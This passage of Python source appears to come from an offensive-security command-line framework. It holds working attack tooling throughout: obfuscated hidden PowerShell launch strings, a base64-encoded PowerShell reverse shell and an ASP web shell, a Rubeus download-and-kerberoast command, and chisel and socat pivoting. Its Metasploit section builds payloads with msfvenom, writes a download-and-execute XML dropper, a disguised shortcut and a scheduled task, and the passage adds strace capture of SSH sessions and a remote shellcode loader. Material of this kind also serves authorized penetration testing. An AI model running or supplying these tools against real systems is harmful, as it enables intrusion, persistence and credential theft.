            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS Hidden -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSt Hidde -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS H -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hidde -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass -Wind Hidde -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass -Win Hid -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowSt Hidd -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowStyle Hidde -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS Hidde -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hid -Enco {base64_command}
            cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hi -Enco {base64_command}
            cmd.exe /c powershell.exe %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e {base64_command}
            """
            print_msg("Another options to payloads: ")
            print_msg(f"\n\n {payloads} \n\n")
        copy2clip(final_command)

        return

    @cmd2.with_category(persistence_category)
    def do_revwin(self, line):
        """
        Creates a base64 encoded PowerShell reverse shell payload specifically for Windows to execute a `.ps1` script from `lhost`.

        1. Checks if `lhost` and `lport` are assign and valid:
            - Uses `check_lhost(lhost)` to verify the `lhost` parameter.
            - Uses `check_lport(lport)` to verify the `lport` parameter.
            - Exits the function if either `lhost` or `lport` is invalid.

        2. Constructs a PowerShell reverse shell command with the following structure:
            - Connects to the specified `lhost` and `lport` using `TCPClient`.
            - Reads data from the TCP stream, executes it, and sends back the results.
            - Appends the current path to the response for interactive use.

        3. Encodes the PowerShell command:
            - Encodes the command in UTF-16LE.
            - Converts the UTF-16LE encoded command to base64.
            - Creates a PowerShell command that executes the base64 encoded payload.

        4. Copies the final PowerShell command to the clipboard:
            - Uses `xclip` to copy the command to the clipboard.

        :param line: This parameter is not used in the function but is present for consistency with the method signature.
        :type line: str
        :returns: None

        Manual execution:
        To manually use the payload:
        - Ensure `lhost` and `lport` are correctly set.
        - Use `xclip` to copy the generated PowerShell command to the clipboard.

        Note: Ensure `xclip` is installed and available on your system.
        """


        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not check_lhost(lhost):
            return
        if not check_lport(lport):
            return

        cmd = """$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""".replace(
            "{lhost}", lhost
        ).replace("{lport}", str(lport))
        # Codifica el comando en UTF-16LE
        utf16le_encoded = cmd.encode("utf-16le")
        # Codifica el resultado en base64
        base64_encoded = base64.b64encode(utf16le_encoded)
        # Convierte el resultado a una cadena y elimina el salto de línea final
        base64_string = base64_encoded.decode("utf-8").strip()
        cmdd = f"""powershell -e {base64_string}"""
        self.cmd(f'printf "{cmdd}" | xclip -sel clip')
        print_msg(f'printf "{cmdd}" | xclip -sel clip')

        return

    @cmd2.with_category(persistence_category)
    def do_asprevbase64(self, line):
        """
        Creates a base64 encoded ASP reverse shell payload and copies it to the clipboard.

        1. Checks if a base64 encoded payload is provided:
            - If no payload is provided, displays an error message and exits the function.

        2. If a payload is provided:
            - Creates an ASP script that uses `WScript.Shell` to execute a PowerShell command encoded in base64.
            - The created ASP script writes the result of the PowerShell command to the response output.
            - Uses `xclip` to copy the ASP script to the clipboard with the provided base64 encoded payload.

        :param line: The base64 encoded payload to be used in the ASP reverse shell.
        :type line: str
        :returns: None

        Manual execution:
        To manually create the ASP payload:
        - Ensure you have the base64 encoded payload ready.
        - Use `xclip` to copy the provided command to the clipboard.

        Note: Ensure `xclip` is installed and available on your system. For help on creating the base64 encoded payload, see `help winbase64payload`.
        """

        if not line:
            print_error(
                f"you need pass the payload in base64 as argument Ex: {GREEN}asprevbase64 LW5JRVgoTmV3LU9iamVjdCBOZXcuV2ViQ2xpZW50KS5kb3dubG9hZFN0cmluZygnaHR0cDovLzEwLjEwLjE0LjI0MS9wcy5wczEnKSBpY29udiAtdCB1dGYtMTZsZQo="
            )
            return
        self.cmd(
            f'echo -n \'<%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -encodedcommand {line}").StdOut.Readall()%>\' | xclip -sel clip'
        )
        print_msg(
            f'Try... echo -n \'<%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -encodedcommand {line}").StdOut.Readall()%>\' | xclip -sel clip'
        )
        return

    @cmd2.with_category(post_exploitation_category)
    def do_rubeus(self, line):
        """
        Copies a command to the clipboard for downloading and running Rubeus.

        1. Checks if `lhost` (local host IP) is set:
            - If `lhost` is not set, displays an error message and exits the function.

        2. If `lhost` is set:
            - Displays a message indicating that the Rubeus downloader command has been copied to the clipboard.
            - The copied command downloads Rubeus from the specified `lhost` and saves it as `Rubeus.exe`.
            - Uses `xclip` to copy the following command to the clipboard:
            - `iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe ; .\\Rubeus.exe kerberoast /creduser:domain.local\\usuario /credpassword:password`

        :param line: Not used in this function.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Ensure that `lhost` is assign correctly.
        - Use `xclip` to copy the provided command to the clipboard.
        - Execute the downloaded Rubeus executable with the provided arguments.

        Note: Ensure `xclip` is installed and available on your system.
        """

        lhost = self.params["lhost"]
        if not lhost:
            print_error(f"lhost must be assign use assign lhost <ip>{RESET}")
            return

        print_msg(
            f"{YELLOW}Rubeus downloader (echo 'iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe' | xclip -sel clip) copied to clipboard. {RESET}"
        )
        self.cmd(
            f"echo 'iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe ; .\\Rubeus.exe kerberoast /creduser:domain.local\\usuario /credpassword:password' | xclip -sel clip"
        )
        return

    @cmd2.with_category(lateral_movement_category)
    def do_socat(self, line):
        """
        Sets up and runs a `socat` tunnel with SOCKS4A proxy support.

        1. If no `line` (IP:port) argument is provided:
            - Displays an error message indicating the need to pass `ip:port`.
            - Exits the function.

        2. Displays a message instructing the user to configure `socks5` at `127.0.0.1:1080` in `/etc/proxychains.conf`.

        3. If a valid `line` argument is provided:
            - Displays the command being run: `socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080`.
            - Executes the `socat` command to listen on port 1080 and forward traffic to the specified IP and port using SOCKS4A proxy.
            - Prints a shutdown message for the `socat` tunnel at port 1080.

        :param line: The IP and port (formatted as `ip:port`) to forward traffic to through the SOCKS4A proxy.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Configure the `socks5` proxy settings in `/etc/proxychains.conf`.
        - Use the `socat` command with appropriate IP and port.

        Note: Ensure that `socat` is installed and properly configured on your system.
        """

        print_msg(
            f"You must seted {GREEN}socks5 127.0.0.1 1080 {YELLOW}at {GREEN}/etc/proxychains.conf{RESET}"
        )
        if not line:
            print_error(
                f"You must pass ip:port by argument ex:{GREEN} socat 10.10.10:445  {WHITE} more help: {CYAN} help socat{RESET} "
            )
            return
        else:
            if line.startswith("fork"):
                domain = self.params["domain"]
                port = input("    [!] Enter TCP/port to fork: (default: 445)") or "445"
                domain = input(f"    [!] Enter TCP/port to fork: (default: {domain})") or domain
                command = f"sudo socat TCP-LISTEN:{port},fork TCP:apt:{port}"
                print_msg(f"Starting socat fork at port: {port}")
                print_msg(command)
                self.cmd(command)
                return
            else:
                print_msg(
                    f"Try... {MAGENTA}socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080{RESET}"
                )
                self.cmd(f"socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080")
                print_msg(
                    f"{YELLOW} Shutdown socat tunnel at sessions in port {RED} 1080 {RESET}"
                )
                return

    @cmd2.with_category(lateral_movement_category)
    def do_chisel(self, line):
        """
        Automates the setup and execution of Chisel server and client for tunneling and port forwarding.

        1. If no `lhost` (local host IP) is assign:
            - Displays an error message indicating the need to assign `lhost` using the `set` command.
            - Exits the function.

        2. If no port argument is provided:
            - Displays an error message indicating the need to provide a port number.
            - Exits the function.

        3. If required Chisel files are not present:
            - Displays an error message prompting the user to run the `download_resources` command.
            - Exits the function.

        4. If a valid port is provided:
            - Displays usage instructions for the Linux and Windows payloads.
            - Constructs and copies the appropriate Chisel command to the clipboard based on user choice (1 for Windows, 2 for Linux).
            - Extracts and sets up Chisel binaries for Linux and Windows from compressed files.
            - Runs the Chisel server on the specified port and prints a shutdown message.

        :param line: The command line input containing the port number for Chisel setup.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Ensure `lhost` is assign using `assign lhost <IP>`.
        - Provide the port number when calling the function.
        - Run the command `download_resources` if the Chisel files are missing.
        - Manually execute the Chisel commands for Linux or Windows as copied to the clipboard.

        Note: Ensure that all required files (`chisel_1.9.1_linux_amd64.gz` and `chisel_1.9.1_windows_amd64.gz`) are available in the `sessions` directory.
        """

        lhost = self.params["lhost"]
        if not lhost:
            print_error(
                f"You must assign lhost ex:{GREEN} assign lhost 10.10.10.10 or payload (alias p)  {WHITE} more help: {CYAN} help set{RESET} "
            )
            return
        if not line:
            print_error(
                f"You must pass the port by argument ex:{GREEN} chisel 3333 {WHITE} more help: {CYAN} help chisel{RESET} "
            )
            return
        if not os.path.exists(
            "sessions/chisel_1.9.1_linux_amd64.gz"
        ) or not os.path.exists("./sessions/chisel_1.9.1_windows_amd64.gz"):
            print_error(
                f"You must run the command {GREEN}download_resources{YELLOW} before run {GREEN}chisel {YELLOW}mode server {GREEN}at port {line}{RESET}"
            )
            return

        args = line.split(" ")

        if len(args) == 1:
            lport = args[0]
            print_msg(
                f"Running {YELLOW}./sessions/chisel_1.9.1_linux_amd64 server -p {lport} --reverse -v {RESET} and copied .\pivot.exe client -v {lhost}:{lport} R:127.0.0.1:socks  to clipboard :D"
            )
            command = f"""iwr -uri http://{lhost}/chisel.exe -OutFile pivot.exe ;"""
            command += " .\\"
            command += f"""pivot.exe client -v {lhost}:{lport} R:127.0.0.1:socks"""
            command1 = f"{command}"

            command = f"""curl http://{lhost}/chisel_1.9.1_linux_amd64 -o chisel ; chmod +x chisel ; """
            command += " ./"
            command += f"""chisel client -v {lhost}:{lport} R:127.0.0.1:socks"""
            command2 = f"{command}"

            print_warn("<modo de uso>")
            print_msg(f"{command1=}")
            print_msg(f"{command2=}")
            print_warn("</modo de uso>")

            choice = input(
                f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1 or 2): {RESET}"
            ).strip()

            if choice == "1":

                copy2clip(command1)

            elif choice == "2":

                copy2clip(command2)


            else:
                print_error("Invalid choice. Please select 1 or 2")
                return

            self.cmd(
                f"cd sessions && gunzip -c chisel_1.9.1_linux_amd64.gz > chisel_1.9.1_linux_amd64 && gunzip -c chisel_1.9.1_windows_amd64.gz > chisel.exe  && chmod +x chisel* && upx chisel.exe && upx chisel_1.9.1_linux_amd64 && ./chisel_1.9.1_linux_amd64 server --reverse -p {lport} --socks5 -v"
            )
            print_msg(
                f"Shutdown chisel tunnel at sessions in port {RED} {line} {RESET}"
            )

        else:
            print_error(
                f"you must pass the port by argument ex:{GREEN} chisel 3333 {WHITE} more help: {CYAN} help chisel{RESET} "
            )
        return

    @cmd2.with_category(command_and_control_category)
    def do_msf(self, line):
        """
        Automates various Metasploit tasks including scanning for vulnerabilities, setting up reverse shells, and creating payloads.

        1. If no arguments are provided:
            - Retrieves the target IP (`rhost`) from parameters.
            - Checks if the IP is valid using `check_rhost()`. If invalid, exits the function.
            - Creates a Metasploit resource script (`/tmp/scan_vulnerabilities.rc`) that includes commands for scanning ports, enumerating services, and checking for known vulnerabilities.
            - Executes Metasploit with the created resource script and then deletes the temporary file.
            - Prints a shutdown message after running the scan.

        2. If the argument starts with "rev":
            - Sets up a reverse shell payload based on the specified platform and user choice (with or without meterpreter).
            - Creates a Metasploit resource script (`/tmp/handler.rc`) for handling incoming reverse shell connections.
            - Executes Metasploit with the created resource script and then deletes the temporary file.
            - Prints a shutdown message after setting up the handler.

        3. If the argument starts with "lnk":
            - Configures parameters (`lhost`, `lport`) for creating a payload.
            - Uses `msfvenom` to generate a payload executable and saves it in the `sessions` directory.
            - Creates an XML file (`download_payload.xml`) that will be used to download and execute the payload on a target machine.
            - Creates a PowerShell script (`create_lnk.ps1`) to generate a shortcut file (`.lnk`) pointing to the payload.
            - Prints instructions and generates a command to copy to the clipboard for setting up the payload and files.

        4. If the argument starts with "autoroute":
            - Configures parameters for setting up a Metasploit session and autorouting.
            - Creates a Metasploit resource script (`/tmp/autoroute.rc`) to handle exploit sessions and assign up autorouting.
            - Executes Metasploit with the resource script and starts a SOCKS proxy for routing traffic.
            - Configures proxychains to use the Metasploit SOCKS proxy and prints instructions for using proxychains with tools.

        :param line: The command line input that determines which Metasploit task to automate.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - For scanning: Create and run the resource script using `msfconsole -r /tmp/scan_vulnerabilities.rc`.
        - For reverse shells: Configure and run the resource script with the appropriate payload settings.
        - For payload generation and shortcuts: Use `msfvenom` and create XML and PowerShell scripts as specified.
        - For autorouting: Create and run the resource script for autorouting and configure proxychains.

        Note: Ensure all required parameters (`lhost`, `lport`, etc.) are assign before running these tasks.
        """

        if not line:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return
            TARGET_IP = rhost
            rc_file_path = "/tmp/scan_vulnerabilities.rc"

            with open(rc_file_path, "w") as file:
                file.write(f"""
            # Configurar la IP del objetivo
            setg RHOSTS {TARGET_IP}

            # Escanear puertos abiertos
            use auxiliary/scanner/portscan/tcp
            set THREADS 10
            run

            # Enumerar servicios y versiones
            use auxiliary/scanner/portscan/tcp
            set PORTS 1-65535
            run

            # Buscar vulnerabilidades conocidas
            use auxiliary/scanner/vuln/ms17_010_eternalblue
            set RHOSTS {TARGET_IP}
            run

            # Probar exploits y enumerar vulnerabilidades
            use auxiliary/scanner/ftp/anonymous
            set RHOSTS {TARGET_IP}
            run

            # Buscar módulos de explotación de vulnerabilidades
            search ms17_010

            # Terminar la sesión
            exit
            """)


            subprocess.run(["msfconsole", "-r", rc_file_path], check=True)

            if os.path.exists(rc_file_path):
                os.remove(rc_file_path)

            print_msg(f"{YELLOW}Shutdown msfconsole scan {RED} [;,;] {RESET}")
            return
        elif line.startswith("rev"):
            """Automate msfconsole exploit setup"""
            args = line.split(" ")

            if len(args) == 1:
                setpayload = "windows/meterpreter/reverse_tcp"
            elif len(args) == 2:
                if args[1] in ["win", "win64", "lin", "lin64", "mac", "mac64", "android"]:
                    print_msg("Select payload type:")
                    print_msg("1: With meterpreter")
                    print_msg("2: Without meterpreter")
                    choice = input("Enter your choice (1 or 2): ").strip()

                    if args[1] == "win":
                        if choice == "1":
                            setpayload = "windows/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "windows/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "win64":
                        if choice == "1":
                            setpayload = "windows/x64/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "windows/x64/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "lin":
                        if choice == "1":
                            setpayload = "linux/x86/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "linux/x86/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "lin64":
                        if choice == "1":
                            setpayload = "linux/x64/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "linux/x64/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "mac":
                        if choice == "1":
                            setpayload = "osx/x86/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "osx/x86/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "mac64":
                        if choice == "1":
                            setpayload = "osx/x64/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "osx/x64/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    elif args[1] == "android":
                        if choice == "1":
                            setpayload = "android/meterpreter/reverse_tcp"
                        elif choice == "2":
                            setpayload = "android/shell_reverse_tcp"
                        else:
                            print_error("Invalid choice")
                            return
                    print_msg(f"Selected payload: {setpayload}")


                else:
                    print_error("Invalid platform specified")

            lhost = self.params["lhost"]
            lport = self.params["lport"]
            if not lhost or not lport:
                print_error(f"lhost or lport must be assign use assign lhost <ip>{RESET}")
                return
            lhost = f"{lhost}"
            lport = f"{lport}"

            rc_file_path = "/tmp/handler.rc"

            with open(rc_file_path, "w") as file:
                file.write(f"""
                use exploit/multi/handler
                set payload {setpayload}
                set LHOST {lhost}
                set LPORT {lport}
                run
                """)

            subprocess.run(["msfconsole", "-r", rc_file_path], check=True)
            if os.path.exists(rc_file_path):
                os.remove(rc_file_path)
            print_msg(f"{YELLOW}Shutdown rev meterpreter sessions {RED} [;,;] {RESET}")
            return

        elif line.startswith("lnk"):
            lhost = self.params["lhost"]
            lport = self.params["lport"]
            if not lhost or not lport:
                print_error(f"lhost or lport must be assign use assign lhost <ip>{RESET}")
                return

            lhost = f"{lhost}"
            lport = f"{lport}"

            web_root = "sessions"
            payload = "C:\\xampp\\htdocs\\payload.exe"
            args = line.split(" ")
            if not lhost or not lport:
                print_error(
                    "lhost o lport deben estar establecidos. Usa 'assign lhost <ip>'"
                )
            else:
                if len(args) == 1:
                    setpayload = "windows/meterpreter/reverse_tcp"
                elif len(args) == 2:
                    if args[1] == "win":
                        setpayload = "windows/meterpreter/reverse_tcp"
                    if args[1] == "win64":
                        setpayload = "windows/x64/meterpreter/reverse_tcp"

                payload_path = os.path.join(web_root, "payload.exe")
                msfvenom_cmd = f"msfvenom -p {setpayload} LHOST={lhost} LPORT={lport} -f exe -o {payload_path}"
                subprocess.run(msfvenom_cmd, shell=True, check=True)
                print_msg("Payload creado con éxito en: " + payload_path)

                xml_content = f"""<?xml version="1.0"?>
                <job>
                <script language="JScript">
                    var objShell = new ActiveXObject("WScript.Shell");
                    var objExec = objShell.Exec("cmd.exe /c powershell -Command \\"Invoke-WebRequest -Uri 'http://{lhost}/payload.exe' -OutFile 'C:\\Windows\\Temp\\payload.exe'; Start-Process 'C:\\Windows\\Temp\\payload.exe'\\"");
                </script>
                </job>
                """
                xml_path = os.path.join(web_root, "download_payload.xml")
                with open(xml_path, "w") as xml_file:
                    xml_file.write(xml_content)
                print_msg("Archivo XML creado con éxito en " + xml_path)
                print_msg(f"Asegúrate de que el payload esté en: {payload}")
                ps_script_content = f"""
                $WshShell = New-Object -ComObject WScript.Shell
                $Shortcut = $WshShell.CreateShortcut("c:\Common Applications\Calculator.lnk")
                $Shortcut.TargetPath = "{payload}"
                $Shortcut.Save()
                """.replace("                ", "")
                ps_script_path = os.path.join("sessions", "create_lnk.ps1")
                with open(ps_script_path, "w") as ps_script_file:
                    ps_script_file.write(ps_script_content)

                print_msg(f"Script de PowerShell creado en {ps_script_path}")
                print_msg(
                    "Ejecuta este script en la máquina Windows para crear el archivo .lnk contenido:"
                )
                print(ps_script_content)

                cmd = f"""echo 'powershell -Command \\"Invoke-WebRequest -Uri \'http://{lhost}/create_lnk.ps1\' -OutFile \'C:\\Windows\\Temp\\create_lnk.ps1\'; schtasks /create /tn \'DownloadPayload\' /ps1 \'C:\\Windows\\Temp\\create_lnk.ps1\' /f; schtasks /run /tn \'DownloadPayload\' ; powershell -ExecutionPolicy Bypass -File create_lnk.ps1' | xclip -sel clip"""
                print_msg(
                    f"El payload y los archivos necesarios han sido generados exitosamente. el comando {cmd} se copio en la clipboard, ejecute www para diponer los archivos mediante un servidor web"
                )
                self.cmd(cmd)
                return

        elif line.startswith("autoroute"):
            args = line.split(" ")
            lhost = self.params["lhost"]
            lport = self.params["lport"]
            if not lhost or not lport:
                print_error(f"lhost or lport must be assign use assign lhost <ip>{RESET}")
                return
            if len(args) == 1:
                setpayload = "windows/meterpreter/reverse_tcp"
            elif len(args) == 2:
                if args[1] == "win":
                    setpayload = "windows/meterpreter/reverse_tcp"
                if args[1] == "win64":
                    setpayload = "windows/x64/meterpreter/reverse_tcp"
                elif args[1] == "lin":
                    setpayload = "linux/x86/meterpreter/reverse_tcp"
                elif args[1] == "lin64":
                    setpayload = "linux/x64/meterpreter/reverse_tcp"
                elif args[1] == "mac":
                    setpayload = "osx/x86/shell_reverse_tcp"
                elif args[1] == "mac64":
                    setpayload = "osx/x64/meterpreter/reverse_tcp"

            session_id = (
                "1"
            )
            target_subnet = "192.168.100.0"
            netmask = "255.255.255.0"
            rc_file_path = "/tmp/autoroute.rc"

            with open(rc_file_path, "w") as file:
                file.write(f"""
            use exploit/multi/handler
            set payload {setpayload}
            set LHOST {lhost}
            set LPORT {lport}
            exploit -j -z

            # After getting a session
            sessions -i {session_id}
            run post/multi/manage/autoroute RHOST={target_subnet} NETMASK={netmask}

            # Exit the Metasploit console
            exit
            """)
            subprocess.run(["msfconsole", "-r", rc_file_path], check=True)
            subprocess.run(
                [
                    "msfconsole",
                    "-q",
                    "-x",
                    "use auxiliary/server/socks_proxy; set SRVHOST 127.0.0.1; set SRVPORT 1080; run -j",
                ],
                check=True,
            )
            # proxychains_conf_path = '/etc/proxychains.conf'
            # with open(proxychains_conf_path, 'a') as file:
            #    file.write("\nsocks4 127.0.0.1 1080")
            print_msg(
                "Proxychains is configured to use the Metasploit SOCKS proxy on 127.0.0.1:1080"
            )
            print_msg(
                "You can now use proxychains with your tools, e.g., proxychains nmap -sT -Pn <target_ip>"
            )

            # Cleanup
            if os.path.exists(rc_file_path):
                os.remove(rc_file_path)

    @cmd2.with_category(exfiltration_category)
    def do_encrypt(self, line):
        """
        Encrypts a file using XOR encryption.

        1. Splits the provided `line` into `file_path` and `key` arguments.
        2. Checks if the correct number of arguments (2) is provided; if not, prints an error message and returns.
        3. Reads the file specified by `file_path`.
        4. Encrypts the file contents using the `xor_encrypt_decrypt` function with the provided `key`.
        5. Writes the encrypted data to a new file with the ".enc" extension added to the original file name.
        6. Prints a message indicating the file has been encrypted.
        7. Catches and handles the `FileNotFoundError` exception if the specified file does not exist, and prints an error message.

        :param line: A string containing the file path and the key separated by a space.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this command, use the following syntax:
            encrypt <file_path> <key>
        Replace `<file_path>` with the path to the file to be encrypted and `<key>` with the encryption key.
        """

        args = shlex.split(line)
        if len(args) != 2:
            print_error("Usage: encrypt <file_path> <key>")
            return

        file_path, key = args

        try:
            with open(file_path, "rb") as f:
                data = f.read()

            encrypted_data = xor_encrypt_decrypt(data, key)
            with open(file_path + ".enc", "wb") as f:
                f.write(encrypted_data)
            print_msg(f"File encrypted: {file_path}.enc")
        except FileNotFoundError:
            print_error(f"File not found: {file_path}")

    @cmd2.with_category(exfiltration_category)
    def do_decrypt(self, line):
        """
        Decrypts a file using XOR encryption.

        1. Splits the provided `line` into `file_path` and `key` arguments.
        2. Checks if the correct number of arguments (2) is provided; if not, prints an error message and returns.
        3. Reads the encrypted file specified by `file_path`.
        4. Decrypts the file contents using the `xor_encrypt_decrypt` function with the provided `key`.
        5. Writes the decrypted data to a new file by removing the ".enc" extension from the original file name.
        6. Prints a message indicating the file has been decrypted.
        7. Catches and handles the `FileNotFoundError` exception if the specified file does not exist, and prints an error message.

        :param line: A string containing the file path and the key separated by a space.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this command, use the following syntax:
            decrypt <file_path> <key>
        Replace `<file_path>` with the path to the encrypted file and `<key>` with the decryption key.
        """

        args = shlex.split(line)
        if len(args) != 2:
            print_error("Usage: decrypt <file_path> <key>")
            return

        file_path, key = args

        try:
            with open(file_path, "rb") as f:
                data = f.read()

            decrypted_data = xor_encrypt_decrypt(data, key)
            with open(file_path.replace(".enc", ""), "wb") as f:
                f.write(decrypted_data)
            print_msg(f"File decrypted: {file_path.replace('.enc', '')}")
        except FileNotFoundError:
            print_error(f"File not found: {file_path}")

    def get_output(self):
        """Devuelve la salida acumulada"""
        return self.output

    @cmd2.with_category(scanning_category)
    def do_sessionssh(self, line):
        """
        Ejecuta un comando para listar las conexiones SSH activas.

        Este método utiliza `netstat` para mostrar las conexiones establecidas (`ESTAB`) y filtra los resultados para mostrar solo las conexiones SSH.

        Parámetros:
        - line: Parámetro no utilizado en esta función.

        Returns:
        - None

        Ejemplos:
        >>> do_sessionssh("")
        (Muestra en consola las conexiones SSH activas)
        """

        command = "netstat -putan |grep -i estab| grep ssh"
        print_msg("Lanzando netstat en busqueda de sessions ssh activas")
        copy2clip(command)
        self.cmd(command)
        return

    @cmd2.with_category(post_exploitation_category)
    def do_sessionsshstrace(self, line):
        """
        Attach strace to a running process and log output to a file.

        This function attaches `strace` to a process specified by its PID,
        tracing system calls related to writing data. The output of `strace`
        is saved to a file named `strace.txt` in the `sessions` directory.

        Parameters:
        - line (str): The PID of the process to attach strace to.

        Raises:
        - ValueError: If the `line` parameter is empty.
        - FileNotFoundError: If `strace` is not installed.

        Example:
        - `sessionsshstrace 666`: Attach strace to process with PID 666.

        Notes:
        - Ensure the `sessions` directory exists or is created before running the command.
        - The command redirects both stdout and stderr to the `strace.txt` file.
        """
        if not line:
            print_error("You must pass the PID of the process to attach strace, e.g., sessionsshstrace 666")
            return
        if not is_binary_present("strace"):
            print_error(f"strace must be installed. Use: {GREEN} apt install strace -y")
            return
        command = f"strace -ff -e trace=write -e write=1,2 -p {line} > sessions/strace.txt 2>&1"
        copy2clip(command)
        print_msg("Launching strace...")
        try:
            subprocess.run(command, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print_error(f"Command failed with return code {e.returncode}.")
        except KeyboardInterrupt:
            print_warn("strace was interrupted by user.")
        except Exception as e:
            print_error(f"An unexpected error occurred: {e}")

        path = os.getcwd()
        file = f"{path}/sessions/strace.txt"

        print_msg("\nSalida de comandos\n")
        salida_strace(file)
        print_msg("\nEntrada del usuario\n")
        teclado_usuario(file)
        print_warn("Stopped strace...")
        return

    @cmd2.with_category(miscellaneous_category)
    def do_lazyscript(self, line):
        """
        Executes commands defined in a lazyscript file.

        This function reads a script file containing commands to be executed
        sequentially. Each command is executed using the onecmd method of the
        cmd.Cmd class. The script file should be located in the 'lazyscripts'
        directory relative to the current working directory.

        Args:
            line (str): The name of the script file to execute (e.g., 'lazyscript.ls').

        Example:
            do_lazyscript('example_script.ls')
            This would execute all commands listed in 'lazyscripts/example_script.ls'.

        """
        script_path = os.path.join(os.getcwd(), 'lazyscripts', line)

        if not os.path.isfile(script_path):
            print_error(f"Script file not found: {script_path}")
            return
        with open(script_path, 'r') as file:
            commands = file.readlines()

        for command in commands:
            command = command.strip()
            if command:
                print_msg(f"Executing command: {command}")
                self.onecmd(command)

    @cmd2.with_category(lateral_movement_category)
    def do_set_proxychains(self, line):
        """
        Relanza la aplicación actual utilizando `proxychains` para enrutar el tráfico
        a través de los proxies configurados.

        Este comando reinicia la aplicación desde el principio utilizando un script
        bash externo llamado `run`, que se encarga de configurar el entorno
        (como activar un entorno virtual) y luego ejecutar la aplicación Python.
        El comando `proxychains` se utiliza para asegurar que cualquier comando
        ejecutado dentro de la aplicación, como `nmap`, sea encaminado a través
        de los proxies especificados en la configuración de `proxychains`.

        Pasos realizados por esta función:
        1. Obtiene la ruta al script `run`.
        2. Relanza el script `run` bajo `proxychains` utilizando `subprocess.run`.
        3. Sale de la instancia actual de la aplicación para evitar duplicación.

        Args:
            line (str): No se utiliza en este comando, pero se incluye como parte
                        de la interfaz estándar de `cmd`.
        """
        print_msg("Restarting with proxychains...")
        run_script_path = "run"
        subprocess.run(["proxychains", "bash", run_script_path] + sys.argv[1:])
        sys.exit()

    @cmd2.with_category(post_exploitation_category)
    def do_shellcode(self, line):
        """
        Generates a Python one-liner to execute shellcode from a given URL.

        This function:
        1. Retrieves the local host (lhost) from the parameters.
        2. Checks if the local host is valid.
        3. Verifies the existence of the `shellcode.bin` file in the expected directory.
        4. Constructs a Python one-liner command that:
            - Fetches the shellcode from the specified URL.
            - Decodes the base64-encoded shellcode.
            - Creates a buffer in memory for the shellcode.
            - Casts the buffer to a function pointer.
            - Executes the shellcode.
        5. Copies the generated command to the clipboard for easy execution.
        """

        lhost = self.params['lhost']
        if not check_lhost(lhost):
            return
        path = os.getcwd()
        if not os.path.exists(f"{path}/sessions/shellcode.bin"):
            print_error(f"shellcode.bin must exist, you need {GREEN}run lazymsfvenom {RED}or {GREEN}venom {RED}before {GREEN}shellcode {RED}command")
            return
        command = f'python3 -c "import base64, ctypes, urllib.request; url = \'http://{lhost}/shellcode.bin\'; response = urllib.request.urlopen(url); shellcode = base64.b64decode(response.read()); shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode)); shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p)); shellcode_func()"'
